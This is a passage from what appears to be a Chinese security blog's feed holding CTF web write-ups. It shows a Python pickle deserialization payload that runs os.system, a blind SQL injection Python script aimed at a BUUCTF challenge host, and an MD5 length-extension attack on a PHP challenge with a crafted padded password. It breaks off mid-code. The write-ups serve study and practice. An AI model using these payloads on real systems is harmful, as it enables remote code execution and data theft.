__已经是os.system，也就成功RCE了。</p><p>payload</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'</span></code></pre><p>命令执行成功。</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105171408311.png" srcset="/img/loading.gif" alt="image-20210105171408311"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>pker</p><p><a href="https://github.com/eddieivan01/pker" target="_blank" rel="noopener">https://github.com/eddieivan01/pker</a></p><p>参考：<a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p><p><a href="https://www.v0n.top/2020/03/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.v0n.top/2020/03/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python反序列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>i春秋新春战‘疫’复现</title>
    <link href="/2020/03/04/I%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E2%80%98%E7%96%AB%E2%80%99%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/03/04/I%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E2%80%98%E7%96%AB%E2%80%99%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="i春秋新春战‘疫’WEB复现"><a href="#i春秋新春战‘疫’WEB复现" class="headerlink" title="i春秋新春战‘疫’WEB复现"></a><strong>i春秋新春战‘疫’WEB复现</strong></h1><p>这个假期过得确实太颓了，再不学习是真的要凉凉。</p><p>反思反思反思…</p><p>还是做题太少了。</p><a id="more"></a><h2 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h2><p>首先常规输下1,2回显不同</p><img src="/2020/03/04/I春秋新春战‘疫’复现/1.png" srcset="/img/loading.gif" title="image"><p>输入1 or 回显SQL Injection Checked.</p><p>这里or被过滤（其实这里直接or返回的是bool(false)，可能间接说明用的不是preg_match?没想清楚是怎么写的，参考别人的wp应该是题目与原题有出入）</p><img src="/2020/03/04/I春秋新春战‘疫’复现/2.png" srcset="/img/loading.gif" title="image"><p>fuzz一下过滤了的关键词</p><img src="/2020/03/04/I春秋新春战‘疫’复现/3.png" srcset="/img/loading.gif" title="image"><p>其中的information被过滤意味着我们常规的查表语句无法使用，就需要有其他数据库来代替它：</p><p>MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限）</p><p><strong>sys.schema_auto_increment_columns</strong></p><p><strong>schema_table_statistics_with_buffer</strong></p><p><strong>x$schema_table_statistics_with_buffer</strong></p><p><strong>sys.x$schema_flattened_keys</strong></p><p>…</p><p>诸如此类还有很多能应用的库。</p><p>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p><p>可是这个库不包含列名，所以又涉及到无列名注入的知识点。</p><p>但无列名注入通常依托union来实现，而这里的union也被过滤了（原题情况是union select不能连用）。</p><p>如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。</p><p>但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。</p><p>例如：</p><pre><code>执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1所以可以进行盲注</code></pre><p>但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题）</p><p>而区分大小写需要使用 <strong>SELECT CONCAT(“A”, CAST(0 AS JSON))</strong> 来另其返回二进制字符串。</p><p>综上，脚本如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php"</span><span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    select <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.x$schema_flattened_keys'</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>            paylaod <span class="token operator">=</span> <span class="token string">"1 &amp;&amp; (select substr(({}),{},1))='{}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>select<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(paylaod)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>            <span class="token punctuation">}</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> i                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#区分大小写(应该是环境有问题 跑不出)</span>    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'-0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    flag_table_name <span class="token operator">=</span> <span class="token string">'f1ag_1s_h3r3_hhhhh'</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>            i <span class="token operator">=</span> flag<span class="token operator">+</span>i            paylaod <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag_table_name<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(paylaod)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>            <span class="token punctuation">}</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                flag<span class="token operator">=</span>i                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">exp3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不区分大小写</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a<span class="token operator">=</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>            payload <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))"</span><span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>    exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>    exp3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>参考：<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104476566" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104476566</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2</a></p><p><strong>持续更新…</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
      <tag>无列名无unionselect注数据</tag>
      
      <tag>无in注表名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HASH长度扩展攻击</title>
    <link href="/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <url>/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。<a id="more"></a></p><h1 id="md5的工作原理"><a href="#md5的工作原理" class="headerlink" title="md5的工作原理"></a>md5的工作原理</h1><p>如下图所示</p><img src="/2019/11/30/md5扩展攻击/1.png" srcset="/img/loading.gif" title="image"><p>其中笼统的一共可以分为四个部分</p><p><strong>*Padding填充</strong></p><p><strong>*Length填充长度</strong></p><p><strong>*初始化向量</strong></p><p><strong>*复杂的函数运算</strong>（这里可以忽略）</p><p>大体概括：md5是分组加密。加密时以每512bit(64byte=&gt;16个数字)为一组，从第一组开始，与四个固定的初始化向量进行复杂运算，进而得到四个新的向量，再将<strong>计算得到的向量作为下一组运算的初始向量</strong>继续运算。</p><p>但是显而易见我们加密的字符大多数情况下不能正好为64byte，md5以填充的方式解决这个问题。</p><h2 id="Padding填充"><a href="#Padding填充" class="headerlink" title="Padding填充"></a>Padding填充</h2><p><u><strong>填多少</strong></u></p><p>md5根据消息的长度来确定填充的字节数，由于64byte中最后的8byte用来存储原消息长度，故</p><p>填充后消息长度 mod 512 = 448 (512-8*8)  bit</p><p>eg.如果信息是‘message’ -&gt; 7byte -&gt; 56bit，那么就填充392bit。</p><p><u><strong>填啥</strong></u></p><p>使用二进制补位</p><p>10000000 …</p><p>转成十六进制就是第一个字节是0x80，剩余数据用 0x00 填充。</p><p>承上面那个例子，那么这里要填 0x80 + 0x00 *48</p><p><strong><u>填充消息长度</u></strong></p><p>这里需要注意长度是小端存储的，即高字节存放在高地址中。</p><h2 id="初始化向量"><a href="#初始化向量" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>A      01 23 45 67     0x67452301<br>B      89 AB CD EF  0xEFCDAB89<br>C      FE DC BA 98  0x98BADCFE<br>D      76 54 32 10     0x10325476</p><p>以上是四个固定的初始化向量，他们也是小端存储。</p><p>再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5<em>值是</em>78e731027d8fd50ed642340b7c9a63b3。</p><img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image"><h1 id="MD5长度扩展攻击"><a href="#MD5长度扩展攻击" class="headerlink" title="MD5长度扩展攻击"></a>MD5长度扩展攻击</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现：</p><p>1.我们要知道salt的长度。(为了能得到正确的填充）<br>2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。<br>3.用户可以提交md5值。</p><p>例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息内容为message，可以构造出下图（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度）</p><img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image"><p>然后它与初始向量复杂运算，得到</p><p>A=0x0231e778<br>B=0x0ed58f7d<br>C=0x0b3442d6<br>D=0xb3639a7c</p><p>也就是上面的MD5值。</p><p>若在已补位后的消息后继续追加字符串‘admin’，</p><p>则会对其再次进行补位成为第二组。</p><p>他会把上面得出的这组值作为初始向量，并与他进行复杂运算。这样会得到最终的md5值e53a681a30ff99e3f6522270ca7db244。</p><p>这个值是md5（消息+填充+追加消息）。实际上就是md5(message+admin)的值。</p><h2 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h2><h3 id="已知salt长度"><a href="#已知salt长度" class="headerlink" title="已知salt长度"></a><strong>已知salt长度</strong></h3><p><strong>实验吧–让我进去</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This secret is 15 characters long for security!</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Congratulations! You are a registered user.\n"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"The flag is "</span><span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"You are not an admin! LEAVE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"sample-hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"admin"</span> <span class="token punctuation">.</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"source"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This source code is outputted here</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Admins Only<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token keyword">If</span> you have the correct credentials<span class="token punctuation">,</span> log in below<span class="token punctuation">.</span> <span class="token keyword">If</span> not<span class="token punctuation">,</span> please <span class="token constant">LEAVE</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    Username<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    Password<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Submit<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>分析判断条件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只要user始终为admin,pw的值不为admin就可达成条件</p><p>同时已知user=admin，pw=admin的 <strong>sample-hash=571580b26c65f306376d4f64e53cb5c7</strong>（从cookie得到）</p><p>题中给出<strong>salt长度为15</strong></p><p>这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。</p><p>工具hashpump</p><img src="/2019/11/30/md5扩展攻击/4.png" srcset="/img/loading.gif" title="image"><p>因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5）</p><img src="/2019/11/30/md5扩展攻击/5.png" srcset="/img/loading.gif" title="image"><p>$$<br>f599284f8f2116348036a3f46e79c12b<br>$$<br>传到cookie的getmein里</p><p>$$<br>password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2<br>$$<br>由于还有个urldecode,转下码post上去得到flag。</p><p>//HashPump下载</p><p>$$<br>git clone <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a><br>apt-get install g++ libssl-dev<br>cd HashPump<br>make<br>make install<br>$$</p><h3 id="未知salt长度"><a href="#未知salt长度" class="headerlink" title="未知salt长度"></a><strong>未知salt长度</strong></h3><p><strong>Jarvis OJ–flag在管理员手里</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token string">"guest"</span><span class="token punctuation">;</span>                <span class="token variable">$salt</span> <span class="token operator">=</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//需要传入被序列化的数据</span>                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"hsh"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span><span class="token operator">===</span><span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$hsh</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     